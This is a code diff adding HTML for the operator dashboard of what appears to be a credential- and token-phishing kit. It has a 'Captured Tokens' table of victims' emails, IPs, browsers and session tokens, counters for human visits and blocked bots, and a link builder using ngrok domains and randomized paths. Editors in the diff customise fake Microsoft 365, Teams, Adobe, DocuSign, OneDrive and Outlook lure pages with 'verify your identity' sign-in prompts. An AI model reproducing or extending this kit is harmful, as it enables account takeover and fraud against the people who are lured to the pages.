+                                    <div class="ab-notif-empty">No notifications yet</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Metrics Bar: TOTAL VISITS | TODAY'S VISITS | HUMAN VISITS | BLOCKED BOTS | ACTIVE | REVOKED -->
+                <div class="ab-stats-row">
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">TOTAL VISITS</div>
+                        <div class="ab-stat-val" id="stat-total-visits">0</div>
+                    </div>
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">TODAY'S VISITS</div>
+                        <div class="ab-stat-val" id="stat-today-visits">0</div>
+                    </div>
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">HUMAN VISITS</div>
+                        <div class="ab-stat-val" id="stat-human-visits" style="color: #4ade80;">0</div>
+                    </div>
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">BLOCKED BOTS</div>
+                        <div class="ab-stat-val" id="stat-bot-visits" style="color: #fbbf24;">0</div>
+                    </div>
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">ACTIVE</div>
+                        <div class="ab-stat-val" id="stat-active-tokens">0</div>
+                    </div>
+                    <div class="ab-stat-box">
+                        <div class="ab-stat-label">REVOKED</div>
+                        <div class="ab-stat-val" id="stat-revoked-tokens">0</div>
+                    </div>
+                </div>
+
+                <!-- Captured Tokens Table Card -->
+                <div class="ab-table-card">
+                    <!-- Top Table Title Bar -->
+                    <div class="ab-table-header">
+                        <div class="ab-table-title-group">
+                            <svg class="ab-lock-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                            <span class="ab-table-title">Captured Tokens</span>
+                            <span class="ab-count-pill" id="ab-captured-count-pill">0</span>
+                        </div>
+                        <div class="ab-table-tools">
+                            <div class="ab-filter-btn-wrap" style="position:relative;">
+                                <button type="button" class="ab-filter-btn" id="ab-filter-toggle-btn" onclick="toggleFilterMenu(event)">
+                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon></svg>
+                                    <span>FILTER</span>
+                                </button>
+                                <div class="ab-filter-popover" id="ab-filter-popover" style="display:none;">
+                                    <div class="ab-filter-popover-title">Filter by Token Status</div>
+                                    <label class="ab-filter-opt"><input type="radio" name="token-status-filter" value="ALL" checked onchange="onStatusFilterChange('ALL')"> All Tokens</label>
+                                    <label class="ab-filter-opt"><input type="radio" name="token-status-filter" value="ACTIVE" onchange="onStatusFilterChange('ACTIVE')"> Active Only</label>
+                                    <label class="ab-filter-opt"><input type="radio" name="token-status-filter" value="REVOKED" onchange="onStatusFilterChange('REVOKED')"> Revoked Only</label>
+                                </div>
+                            </div>
+                            <div class="ab-search-box">
+                                <span class="ab-search-label">SEARCH</span>
+                                <input type="text" id="ab-table-search" placeholder="Search..." oninput="onTableSearch(this.value)">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Controls Sub-Row: Entries + Select + Pagination -->
+                    <div class="ab-table-subbar">
+                        <div class="ab-subbar-left">
+                            <span class="ab-entries-label">ENTRIES</span>
+                            <select id="ab-page-size-select" class="ab-entries-select" onchange="changeAbPageSize(this.value)">
+                                <option value="10" selected>10</option>
+                                <option value="25">25</option>
+                                <option value="50">50</option>
+                                <option value="100">100</option>
+                            </select>
+                            <button type="button" class="ab-select-pill-btn" onclick="toggleSelectAllRows()">SELECT</button>
+                            <button type="button" class="ab-icon-circle-btn" onclick="resetTableSort()" title="Reset sorting / filters">
+                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M7 12h10M10 18h4"></path></svg>
+                            </button>
+                        </div>
+                        <div class="ab-subbar-right">
+                            <span class="ab-page-info" id="ab-pagination-info">Showing 0 to 0 of 0 entries</span>
+                            <div class="ab-page-nav" id="ab-pagination-nav"></div>
+                        </div>
+                    </div>
+
+                    <!-- Data Table -->
+                    <div class="ab-table-scroll">
+                        <table class="ab-table">
+                            <thead>
+                                <tr>
+                                    <th class="sortable" onclick="sortAbTable('sn')">S/N <span class="ab-sort-icon" id="sort-icon-sn">⇅</span></th>
+                                    <th class="sortable" onclick="sortAbTable('name')">NAME <span class="ab-sort-icon" id="sort-icon-name">⇅</span></th>
+                                    <th class="sortable" onclick="sortAbTable('email')">EMAIL <span class="ab-sort-icon" id="sort-icon-email">⇅</span></th>
+                                    <th>ROLES</th>
+                                    <th>IP</th>
+                                    <th>BROWSER</th>
+                                    <th class="sortable" onclick="sortAbTable('added')">ADDED <span class="ab-sort-icon" id="sort-icon-added">⇅</span></th>
+                                    <th class="sortable" onclick="sortAbTable('token')">TOKEN <span class="ab-sort-icon" id="sort-icon-token">⇅</span></th>
+                                    <th style="text-align:center;">ACTIONS</th>
+                                </tr>
+                            </thead>
+                            <tbody id="ab-captured-tbody"></tbody>
+                        </table>
+                    </div>
+
+                    <!-- Bottom Pagination Subbar -->
+                    <div class="ab-table-subbar ab-table-subbar-bottom">
+                        <div class="ab-subbar-left">
+                            <span class="ab-entries-label">ENTRIES</span>
+                            <select class="ab-entries-select" onchange="changeAbPageSize(this.value)">
+                                <option value="10" selected>10</option>
+                                <option value="25">25</option>
+                                <option value="50">50</option>
+                                <option value="100">100</option>
+                            </select>
+                            <button type="button" class="ab-select-pill-btn" onclick="toggleSelectAllRows()">SELECT</button>
+                        </div>
+                        <div class="ab-subbar-right">
+                            <span class="ab-page-info" id="ab-pagination-info-bottom">Showing 0 to 0 of 0 entries</span>
+                            <div class="ab-page-nav" id="ab-pagination-nav-bottom"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="page-templates" class="page" style="padding:0; overflow:hidden;">
+            <div class="lg-container">
+                <!-- Top Header & Subnav -->
+                <div class="lg-top-header">
+                    <div class="lg-top-left">
+                        <div class="lg-page-title">
+                            <span style="font-size: 14px; opacity: 0.7; cursor: pointer;" onclick="showPage('dashboard')">❮</span>
+                            <span>Templates</span>
+                        </div>
+                        <div class="lg-subnav">
+                            <div class="lg-nav-tab active"><span>🚀</span> Crimson Paw Links</div>
+                            <div class="lg-nav-tab" onclick="openBuyDomainsModal()"><span>🛒</span> Buy domains</div>
+                            <div class="lg-nav-tab" onclick="openDeletedDomainsModal()"><span>🗑️</span> Deleted Domain</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Section: Deployment -->
+                <div class="lg-section-title">
+                    <span>🚀</span> Deployment
+                </div>
+
+                <!-- Main Two-Column Split -->
+                <div class="lg-main-split">
+                    <!-- Left: Controls & Editors -->
+                    <div class="lg-controls-pane">
+                        <!-- DOMAIN -->
+                        <div class="lg-form-group">
+                            <label class="lg-label">DOMAIN / TUNNEL</label>
+                            <div class="lg-input-wrap" style="display:flex; flex-direction:column; gap:6px;">
+                                <select id="lg-domain" class="lg-select" onchange="onDomainSelectChange()">
+                                    <option value="127.0.0.1:5000">127.0.0.1:5000 (Localhost Dev)</option>
+                                    <option value="__custom__">➕ Enter Custom Domain / ngrok URL...</option>
+                                </select>
+                                <input type="text" id="lg-custom-domain" class="lg-input" placeholder="e.g. xxxx.ngrok-free.app" style="display:none;" oninput="onFieldChange()">
+                            </div>
+                        </div>
+
+                        <!-- SUBDOMAIN (OPTIONAL) -->
+                        <div class="lg-form-group">
+                            <label class="lg-label">SUBDOMAIN (OPTIONAL)</label>
+                            <div class="lg-input-wrap">
+                                <input type="text" id="lg-subdomain" class="lg-input" placeholder="e.g. login" oninput="onFieldChange()" value="">
+                                <button type="button" class="lg-input-btn" title="Randomize Subdomain" onclick="randomizeSubdomain()">🎲</button>
+                            </div>
+                        </div>
+
+                        <!-- PATH -->
+                        <div class="lg-form-group">
+                            <label class="lg-label">PATH</label>
+                            <div class="lg-input-wrap">
+                                <input type="text" id="lg-path" class="lg-input" placeholder="e.g. verify" oninput="lgPathUserCustomized = (this.value.trim().length > 0); onFieldChange()" value="m365-verify">
+                                <button type="button" class="lg-input-btn" title="Randomize Path (text variations)" onclick="randomizePath()">🎲</button>
+                            </div>
+                        </div>
+
+
+                        <!-- PRE-LAND EDITOR (Accordion) -->
+                        <div class="lg-accordion" id="lg-preland-section">
+                            <div class="lg-acc-header" onclick="toggleAccordion('lg-preland-body')">
+                                <div class="lg-acc-title">PRE-LAND ✎ EDITOR</div>
+                                <span style="font-size:12px; color:#a49498;">▼</span>
+                            </div>
+                            <div id="lg-preland-body" class="lg-acc-body collapsed">
+                                <select id="lg-template-select" class="lg-select" onchange="onTemplateSelectChange()">
+                                    <option value="None">🚫 None (Direct Landing Page — No Pre-land)</option>
+                                    <option value="Microsoft 365" selected>Microsoft 365</option>
+                                    <option value="Microsoft Teams">Microsoft Teams</option>
+                                    <option value="Cloud Voicemail">Cloud Voicemail</option>
+                                    <option value="Adobe">Adobe</option>
+                                    <option value="DocuSign">DocuSign</option>
+                                    <option value="Dropbox">Dropbox</option>
+                                    <option value="OneDrive">OneDrive</option>
+                                    <option value="QuickBooks">QuickBooks</option>
+                                    <option value="Outlook">Outlook</option>
+                                    <option value="SharePoint">SharePoint</option>
+                                </select>
+
+                                <!-- GATE (SPINNER) -->
+                                <div class="lg-subgroup-title">GATE (SPINNER)</div>
+                                <div class="lg-row-2">
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">PAGE COLOR</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-page-color" class="lg-color-box" value="#ffffff" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">SPINNER COLOR</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-spin-color" class="lg-color-box" value="#e50914" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="lg-form-group">
+                                    <label class="lg-label">SPINNER SIZE (PX)</label>
+                                    <input type="number" id="lg-spin-size" class="lg-input" value="48" min="20" max="100" oninput="onFieldChange()">
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">PAGE BACKGROUND IMAGE</label>
+                                        <button type="button" id="lg-bg-image-show" class="lg-toggle-show active" data-visible="1" onclick="toggleBgImageShow()">Show</button>
+                                    </div>
+                                    <div class="lg-row-inline">
+                                        <label class="lg-file-btn"><input type="file" id="lg-bg-file" style="display:none;" onchange="onBgImageUpload(event)">Choose File</label>
+                                        <span id="lg-bg-file-txt" style="font-size:11px; color:#a49498;">Blueprint Floor Plan (Default)</span>
+                                        <button type="button" class="lg-default-btn" onclick="resetBgImageToBlueprint()">DEFAULT BLUEPRINT</button>
+                                    </div>
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">PAGE BACKGROUND BLUR</label>
+                                        <span id="lg-blur-val" style="font-size:11px; color:#ff6b72; font-family:monospace;">8%</span>
+                                    </div>
+                                    <input type="range" id="lg-blur-slider" min="0" max="100" value="8" style="accent-color:#e50914; width:100%; cursor:pointer;" oninput="document.getElementById('lg-blur-val').innerText=this.value+'%'; updateIframeLiveBlur(this.value); onFieldChange();">
+                                    <span style="font-size:10px; color:#a49498;">0 - sharp : 100 - extremely blurred (image only)</span>
+                                </div>
+
+                                <!-- CONTENT BOX HEADER -->
+                                <div class="lg-subgroup-title">CONTENT BOX HEADER</div>
+                                <div class="lg-row-2">
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CUSTOM LOGO</label>
+                                        <div class="lg-row-inline">
+                                            <label class="lg-file-btn"><input type="file" id="lg-logo-file" style="display:none;" onchange="onLogoUpload(event)">Choose File</label>
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <label class="lg-label">CARD BACKGROUND</label>
+                                        <div class="lg-row-inline">
+                                            <input type="color" id="lg-card-bg" class="lg-color-box" value="#ffffff" oninput="onFieldChange()">
+                                            <button type="button" class="lg-default-btn" onclick="document.getElementById('lg-card-bg').value='#ffffff'; onFieldChange();">USE TEMPLATE DEFAULT</button>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">STATUS TAG (PILL)</label>
+                                        <button type="button" id="lg-status-tag-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-status-tag-show')">Show</button>
+                                    </div>
+                                    <input type="text" id="lg-status-tag" class="lg-input" value="Microsoft 365 · Protected Asset" oninput="onFieldChange()">
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">TITLE</label>
+                                        <button type="button" id="lg-title-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-title-show')">Show</button>
+                                    </div>
+                                    <input type="text" id="lg-title" class="lg-input" value="Protected Document" oninput="onFieldChange()">
+                                </div>
+
+                                <!-- CONTENT BODIES -->
+                                <div class="lg-subgroup-title">CONTENT BODIES</div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">DESCRIPTION</label>
+                                        <button type="button" id="lg-desc-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-desc-show')">Show</button>
+                                    </div>
+                                    <textarea id="lg-desc" class="lg-textarea" oninput="onFieldChange()">This file is protected by your organization's security policies, please verify your identity to access.</textarea>
+                                </div>
+                                <!-- TEMPLATE-SPECIFIC PRE-LAND CONTENT GROUPS -->
+                                <!-- 1. Generic Document Templates (Microsoft 365, OneDrive, SharePoint, Adobe, DocuSign, Dropbox, QuickBooks) -->
+                                <div id="preland-group-document">
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">DOCUMENT NAME</label>
+                                                <button type="button" id="lg-doc-name-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-doc-name-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-doc-name" class="lg-input" value="Financial-Report-2026.docx" oninput="onFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">DOCUMENT BADGE</label>
+                                                <button type="button" id="lg-doc-badge-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-doc-badge-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-doc-badge" class="lg-input" value="DOCX" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">DOCUMENT META</label>
+                                            <button type="button" id="lg-doc-meta-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-doc-meta-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-doc-meta" class="lg-input" value="Cashflow Statement - 3.2 MB" oninput="onFieldChange()">
+                                    </div>
+                                </div>
+
+                                <!-- 2. Outlook Mailbox & Message Fields -->
+                                <div id="preland-group-outlook" style="display:none;">
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">SENDER / MAILBOX LINE</label>
+                                            <button type="button" id="lg-outlook-sender-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-outlook-sender-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-outlook-sender" class="lg-input" value="Security Compliance Center &lt;compliance@organization.com&gt;" oninput="onFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">MESSAGE SUBJECT / TOPIC</label>
+                                            <button type="button" id="lg-outlook-subject-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-outlook-subject-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-outlook-subject" class="lg-input" value="Confidential Employee Review &amp; Retention Notice" oninput="onFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">ENCRYPTION / SECURITY NOTICE</label>
+                                            <button type="button" id="lg-outlook-meta-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-outlook-meta-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-outlook-meta" class="lg-input" value="TLS 1.3 Protected · Single-Use Decryption Token" oninput="onFieldChange()">
+                                    </div>
+                                </div>
+
+                                <!-- 3. Microsoft Teams Meeting Fields -->
+                                <div id="preland-group-teams" style="display:none;">
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">MEETING TOPIC</label>
+                                            <button type="button" id="lg-teams-topic-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-topic-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-teams-topic" class="lg-input" value="Q4 Executive Strategy &amp; Security Review" oninput="onFieldChange()">
+                                    </div>
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">MEETING ORGANIZER</label>
+                                            <button type="button" id="lg-teams-organizer-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-organizer-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-teams-organizer" class="lg-input" value="David Vance (Senior VP Operations)" oninput="onFieldChange()">
+                                    </div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">SCHEDULED TIME</label>
+                                                <button type="button" id="lg-teams-time-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-time-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-teams-time" class="lg-input" value="Today • Scheduled 45 mins" oninput="onFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">MEETING ID</label>
+                                                <button type="button" id="lg-teams-id-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-id-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-teams-id" class="lg-input" value="942 810 4392" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">PASSCODE</label>
+                                                <button type="button" id="lg-teams-passcode-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-passcode-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-teams-passcode" class="lg-input" value="••••••" oninput="onFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">LOBBY NOTICE</label>
+                                                <button type="button" id="lg-teams-lobby-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-teams-lobby-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-teams-lobby" class="lg-input" value="4 colleagues currently waiting in lobby" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- 4. Cloud Voicemail Fields -->
+                                <div id="preland-group-voicemail" style="display:none;">
+                                    <div class="lg-form-group">
+                                        <div style="display:flex; justify-content:space-between; align-items:center;">
+                                            <label class="lg-label">CALLER ID / SENDER</label>
+                                            <button type="button" id="lg-vm-caller-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-vm-caller-show')">Show</button>
+                                        </div>
+                                        <input type="text" id="lg-vm-caller" class="lg-input" value="+1 (800) 419-7250 / Corporate Partner" oninput="onFieldChange()">
+                                    </div>
+                                    <div class="lg-row-2">
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">RECEIVED TIME</label>
+                                                <button type="button" id="lg-vm-time-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-vm-time-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-vm-time" class="lg-input" value="Today, 11:24 AM (14 min ago)" oninput="onFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">AUDIO DURATION</label>
+                                                <button type="button" id="lg-vm-duration-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-vm-duration-show')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-vm-duration" class="lg-input" value="0:48" oninput="onFieldChange()">
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- BUTTON & FOOTER -->
+                                <div class="lg-subgroup-title">BUTTON & FOOTER</div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">BUTTON LABEL</label>
+                                        <button type="button" id="lg-btn-label-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-btn-label-show')">Show</button>
+                                    </div>
+                                    <input type="text" id="lg-btn-label" class="lg-input" value="Access Protected File" oninput="onFieldChange()">
+                                </div>
+                                <div class="lg-form-group">
+                                    <label class="lg-label">BUTTON COLOR</label>
+                                    <div class="lg-row-inline">
+                                        <input type="color" id="lg-btn-color" class="lg-color-box" value="#e50914" oninput="onFieldChange()">
+                                        <button type="button" class="lg-default-btn" onclick="resetBtnColor()">USE TEMPLATE DEFAULT</button>
+                                    </div>
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">FOOTER CAPTION</label>
+                                        <button type="button" id="lg-foot1-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-foot1-show')">Show</button>
+                                    </div>
+                                    <input type="text" id="lg-foot1" class="lg-input" value="Verify your identity to access this file" oninput="onFieldChange()">
+                                </div>
+                                <div class="lg-form-group">
+                                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                                        <label class="lg-label">FOOTER TEXT</label>
+                                        <button type="button" id="lg-foot2-show" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-foot2-show')">Show</button>
+                                    </div>
+                                    <input type="text" id="lg-foot2" class="lg-input" value="End-to-end encrypted" oninput="onFieldChange()">
+                                </div>
+
+                                <button type="button" class="lg-reset-link" onclick="resetCustomizations()">RESET ALL CUSTOMIZATIONS</button>
+                            </div>
+                        </div>
+
+                        <!-- LANDING EDITOR (Accordion) -->
+                        <div class="lg-accordion" id="lg-landing-section">
+                            <div class="lg-acc-header" onclick="toggleAccordion('lg-landing-body')">
+                                <div class="lg-acc-title">LANDING ✎ EDITOR</div>
+                                <span style="font-size:12px; color:#a49498;">▼</span>
+                            </div>
+                            <div id="lg-landing-body" class="lg-acc-body collapsed">
+                                <div class="lg-form-group" style="margin-bottom:6px;">
+                                    <select id="lg-landing-template" class="lg-select" onchange="onLandingTemplateChange()">
+                                        <option value="Adobe" selected>Adobe</option>
+                                        <option value="Microsoft Teams">Microsoft Teams</option>
+                                        <option value="Cloud Voicemail">Cloud Voicemail</option>
+                                        <option value="DocuSign">DocuSign</option>
+                                        <option value="Dropbox">Dropbox</option>
+                                        <option value="OneDrive">OneDrive</option>
+                                        <option value="QuickBooks">QuickBooks</option>
+                                        <option value="Outlook">Outlook</option>
+                                        <option value="SharePoint">SharePoint</option>
+                                        <option value="Microsoft 365">Microsoft 365</option>
+                                    </select>
+                                </div>
+
+                                <!-- SECTION 1: LEFT PANEL BRANDING -->
+                                <div class="lg-editor-box" id="lg-land-left-branding-box">
+                                    <div class="lg-box-title"><span>LEFT PANEL BRANDING</span></div>
+                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                                        <label class="lg-label" style="margin-bottom:0;">SHOW LEFT COLUMN</label>
+                                        <label class="lg-switch"><input type="checkbox" id="lg-land-show-left" checked onchange="onLandingFieldChange()"><span class="lg-slider"></span></label>
+                                    </div>
+                                    <div id="lg-land-left-branding-controls" style="transition:all 0.25s ease;">
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">CUSTOM LOGO</label>
+                                            <input type="file" id="lg-land-logo-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onLandingLogoUpload(event)">
+                                            <div class="lg-row-inline" style="margin-top:4px;">
+                                                <button type="button" class="lg-default-btn" onclick="resetLandingLogo()">USE DEFAULT TEMPLATE LOGO</button>
+                                            </div>
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">LEFT PANEL TITLE</label>
+                                                <button type="button" id="lg-show-land-left-title" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-left-title')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-left-title" class="lg-input" value="Adobe" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">LEFT PANEL SUBTITLE</label>
+                                                <button type="button" id="lg-show-land-left-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-left-desc')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-left-desc" class="lg-input" value="Document awaiting your signature." oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">LEFT PAGE BACKGROUND COLOR</label>
+                                            <div class="lg-row-inline">
+                                                <input type="color" id="lg-land-left-color" class="lg-color-box" value="#FA0F00" oninput="onLandingFieldChange()">
+                                                <button type="button" class="lg-default-btn" onclick="resetLandColor('lg-land-left-color', '#FA0F00')">USE TEMPLATE DEFAULT</button>
+                                            </div>
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                                <label class="lg-label">LEFT PAGE BACKGROUND IMAGE</label>
+                                                <button type="button" id="lg-show-land-left-bg" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-left-bg'); onLandingFieldChange();">Show</button>
+                                            </div>
+                                            <input type="file" id="lg-land-left-bg-file" accept="image/*" class="lg-input" style="padding:6px; font-size:0.75rem;" onchange="onLandingLeftBgUpload(event)">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <label class="lg-label">LEFT PANEL 3D DESIGN</label>
+                                            <div class="lg-row-inline">
+                                                <button type="button" class="lg-default-btn" style="background:#261115;border:1px solid #5a1c22;padding:5px 12px;border-radius:5px;color:#f0ebed;font-weight:700;" onclick="showToast('Random 3D design assigned')">RANDOM DESIGN</button>
+                                                <span style="font-size:0.72rem;color:#ff8b94;font-weight:600;">USE DEFAULT #1/60</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- SECTION 2: RIGHT COLUMN MODE -->
+                                <div class="lg-editor-box">
+                                    <div class="lg-box-title" style="display:flex; justify-content:space-between; align-items:center;">
+                                        <span>RIGHT COLUMN MODE</span>
+                                        <div class="lg-mode-capsule">
+                                            <span class="lg-mode-btn" id="chip-mode-S" onclick="setLandingMode('S')">S</span>
+                                            <span class="lg-mode-btn" id="chip-mode-B" onclick="setLandingMode('B')">B</span>
+                                            <span class="lg-mode-btn active" id="chip-mode-A" onclick="setLandingMode('A')">A</span>
+                                            <span class="lg-mode-btn" id="chip-mode-R" onclick="setLandingMode('R')">R</span>
+                                        </div>
+                                    </div>
+
+                                    <!-- Mode S: Standard -->
+                                    <div id="mode-section-S" style="display:flex; flex-direction:column; gap:10px;">
+                                        <div class="lg-subheading">RIGHT COLUMN — TITLES & DESCRIPTION</div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">RIGHT PANEL TITLE</label>
+                                                <button type="button" id="lg-show-land-title" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-title')">Show</button>
+                                            </div>
+                                            <input type="text" id="lg-land-title" class="lg-input" value="Sign Document" oninput="onLandingFieldChange()">
+                                        </div>
+                                        <div class="lg-form-group">
+                                            <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                <label class="lg-label">DESCRIPTION UNDER TITLE</label>
+                                                <button type="button" id="lg-show-land-desc" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-desc')">Show</button>
+                                            </div>
+                                            <textarea id="lg-land-desc" class="lg-textarea" oninput="onLandingFieldChange()">Sign in with your Microsoft account to verify your identity and complete the signing process.</textarea>
+                                        </div>
+                                        <div class="lg-subheading">DOCUMENT CARD</div>
+                                        <div class="lg-row-2">
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">DOCUMENT NAME</label>
+                                                    <button type="button" id="lg-show-land-doc-name" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-doc-name')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-doc-name" class="lg-input" value="Service-Agreement.pdf" oninput="onLandingFieldChange()">
+                                            </div>
+                                            <div class="lg-form-group">
+                                                <div style="display:flex;justify-content:space-between;align-items:center;">
+                                                    <label class="lg-label">BADGE</label>
+                                                    <button type="button" id="lg-show-land-doc-badge" class="lg-toggle-show active" data-visible="1" onclick="toggleShow('lg-show-land-doc-badge')">Show</button>
+                                                </div>
+                                                <input type="text" id="lg-land-doc-badge" class="lg-input" value="PDF" oninput="onLandingFieldChange()">
+                                            </div>
+                                        </div>
